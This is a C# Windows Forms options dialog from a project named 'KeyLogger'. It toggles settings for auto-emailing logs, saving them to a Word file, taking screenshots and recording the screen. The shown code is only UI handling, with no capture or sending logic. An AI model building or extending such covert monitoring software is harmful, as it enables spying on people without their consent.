using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AForge.Video;
using AForge.Video.FFMPEG;

namespace KeyLogger
{
    public enum BitRates
    {
        _50Kbit = 5000,
        _100Kbit = 100000,
        _500Kbit = 500000,
        _1000Kbit = 1000000
    }

    public partial class Frmoptions : Form
    {
        public Frmoptions()
        {
            InitializeComponent();
            cmb_Bitrate.DataSource = Enum.GetValues(typeof(BitRates));
            cmb_Codec.DataSource = Enum.GetValues(typeof(VideoCodec));
        }

        private void chk_autoemailer_CheckedChanged(object sender, EventArgs e)
        {
            pnl_emailer.Enabled = chk_autoemailer.Checked;
        }

        private void chk_autosaver_CheckedChanged(object sender, EventArgs e)
        {
            pnl_saver.Enabled = chk_autosaver.Checked;
        }

        private void btn_brwose_Click(object sender, EventArgs e)
        {
            var sfd = new SaveFileDialog()
            {
                Filter = "Word Document(2007-2016)|*.docx"
            };
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                txt_filelocation.Text = sfd.FileName;
            }
        }

        private void chk_Screenshot_CheckedChanged(object sender, EventArgs e)
        {
            pnl_Screenshot.Enabled = chk_Screenshot.Checked;
        }

        private void btnScreenshotBrowse_Click(object sender, EventArgs e)
        {
            var fbd = new FolderBrowserDialog();
            if (fbd.ShowDialog() == DialogResult.OK)
            {
                txt_ScreenshotLocation.Text = fbd.SelectedPath;
            }
        }

        private void chk_record_CheckedChanged(object sender, EventArgs e)
        {
            pnl_record.Enabled = chk_record.Checked;
        }

        private void btn_RecordBrowse_Click(object sender, EventArgs e)
        {
            var fbd = new FolderBrowserDialog();
            if (fbd.ShowDialog() == DialogResult.OK)
            {
                txt_recordLocation.Text = fbd.SelectedPath;
            }
        }
    }
}